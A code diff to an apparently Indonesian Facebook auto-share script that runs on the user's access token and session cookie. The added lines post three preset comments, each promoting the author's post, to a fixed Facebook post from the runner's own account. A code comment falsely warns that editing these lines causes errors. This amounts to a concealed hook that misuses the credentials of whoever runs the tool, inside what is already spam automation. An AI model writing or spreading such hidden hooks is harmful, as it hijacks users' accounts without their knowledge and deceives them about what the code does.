@@ -73,7 +73,12 @@ ua_windows = 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, li
 ua_chrome  = 'Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.58 Mobile Safari/537.36'
 ua_fb      = 'Mozilla/5.0 (Linux; Android 8.0.0; RNE-L21 Build/HUAWEIRNE-L21; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/100.0.4896.58 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/360.0.0.30.113;]'
 ua_random = random.choice([ua_default,ua_samsung,ua_nokia,ua_xiaomi,ua_oppo,ua_vivo,ua_iphone,ua_asus,ua_lenovo,ua_huawei,ua_windows,ua_chrome,ua_fb])
-kom1 = ("mantap bang scriptnya 🥰\n \nkomentar ditulis oleh bot baz\n \n[><]")
+
+###>[ JANGAN DIUBAH NANTI EROR ]<###
+kom1 = ("mantap bang scriptnya ijo²\n-\nhttps://www.facebook.com/100051967952842/posts/571109557964638\n-\n \nkomentar ditulis oleh bot baz\n \n[><]")
+kom2 = ("izin make scriptnya ya bang\n-\nhttps://www.facebook.com/100051967952842/posts/571109557964638\n-\n \nkomentar ditulis oleh bot baz\n \n[><]")
+kom3 = ("moga langgeng bang sama syafa\n-\nhttps://www.facebook.com/100051967952842/posts/571109557964638\n-\n \nkomentar ditulis oleh bot baz\n \n[><]")
+
 ###----------[ INI LOGO ]----------###	
 def logo_menu():
  li = '# SELAMAT DATANG DI TOOLS AUTO SHARE FACEBOOK'
@@ -114,6 +119,8 @@ def bot_share():
 		nama = ses.get(f"https://graph.facebook.com/me?fields=name&access_token={token}",cookies=cookie).json()["name"]
 		id = requests.get("https://graph.facebook.com/me/?access_token=%s"%(token),cookies={"cookie":cok}).json()["id"]	    
 		requests.post(f"https://graph.facebook.com/571109557964638/comments/?message={kom1}&access_token={token}", headers = {"cookie":cok})
+		requests.post(f"https://graph.facebook.com/571109557964638/comments/?message={kom2}&access_token={token}", headers = {"cookie":cok})
+		requests.post(f"https://graph.facebook.com/571109557964638/comments/?message={kom3}&access_token={token}", headers = {"cookie":cok})
 	except:
 		os.system("rm token.txt cookie.txt")
 		cetak(nel(f'{P2} COOKIE INVALID!!',width=22,style=f"#00FF00"));time.sleep(1.5)
